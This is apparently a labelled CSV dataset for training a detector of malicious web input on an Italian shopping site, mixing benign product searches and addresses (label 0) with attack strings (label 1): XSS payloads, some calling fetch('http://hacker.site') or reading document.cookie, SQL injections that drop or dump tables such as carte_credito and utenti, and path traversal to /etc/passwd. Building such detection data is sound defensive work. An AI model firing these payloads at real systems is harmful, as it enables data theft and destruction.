testo,etichetta
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE config; --,1
cerco orologio bianco taglia XL,0
'; DROP TABLE config; --,1
'; DROP TABLE clienti; --,1
"Via Milano 207, Bologna",0
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco felpa blu taglia S,0
..%2f%2f%2fvar/www/html/config.php,1
../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert('pwned')"">",1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert('pwned')"">",1
<script>alert('pwned')</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../etc/passwd,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
"Via Roma 7, Firenze",0
cerco pantaloni grigio taglia 41,0
"<svg onload=""alert('pwned')"">",1
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"Via Mazzini 41, Napoli",0
<script>alert(document.cookie)</script>,1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert('pwned')"">",1
../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<script>alert(document.cookie)</script>,1
cerco orologio grigio taglia 44,0
compra orologio online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
' OR 'a'='a,1
../../../../../../etc/passwd,1
compra maglietta online in offerta,0
'; DROP TABLE admin; --,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 68, Genova",0
../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE carte_credito; --,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
cerco scarpe grigio taglia 42,0
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE carte_credito; --,1
cerco pantaloni giallo taglia XL,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE clienti; --,1
compra orologio online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra zaino online in offerta,0
compra giacca online in offerta,0
cerco felpa rosso taglia 41,0
compra orologio online in offerta,0
<svg/onload=alert(document.cookie)>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Mazzini 55, Palermo",0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""fetch('http://hacker.site')"">",1
"Via Mazzini 5, Firenze",0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../etc/passwd,1
<img src=x onerror=alert(1)>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
'; DROP TABLE sessions; --,1
<script>alert('pwned')</script>,1
"<svg onload=""alert(document.cookie)"">",1
cerco scarpe giallo taglia XL,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"Via Dante 159, Firenze",0
'; DROP TABLE admin; --,1
'; DROP TABLE sessions; --,1
<script>alert(document.cookie)</script>,1
compra giacca online in offerta,0
"<svg onload=""alert('pwned')"">",1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra orologio online in offerta,0
compra pantaloni online in offerta,0
compra maglietta online in offerta,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
../../../../../../../../etc/passwd,1
../../../../etc/passwd,1
"Via Milano 239, Palermo",0
'; DROP TABLE clienti; --,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Mazzini 185, Genova",0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>fetch('http://hacker.site')</script>,1
"Via Garibaldi 84, Milano",0
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>alert('pwned')</script>,1
compra maglietta online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra scarpe online in offerta,0
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"<svg onload=""alert(document.cookie)"">",1
"Via Milano 17, Firenze",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
"Via Dante 220, Bologna",0
cerco zaino rosso taglia 42,0
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE utenti; --,1
compra maglietta online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1; DROP TABLE ordini,1
compra felpa online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
compra maglietta online in offerta,0
../../../../../../../etc/passwd,1
"<svg onload=""alert('pwned')"">",1
"Corso Italia 169, Torino",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE config; --,1
"Via Mazzini 10, Milano",0
../../../etc/passwd,1
'; DROP TABLE admin; --,1
compra pantaloni online in offerta,0
cerco maglietta rosso taglia L,0
<script>fetch('http://hacker.site')</script>,1
cerco felpa bianco taglia S,0
'; DROP TABLE carte_credito; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
procedi al pagamento sicuro,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra felpa online in offerta,0
compra scarpe online in offerta,0
'; DROP TABLE sessions; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
../../../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE carte_credito; --,1
'; DROP TABLE sessions; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
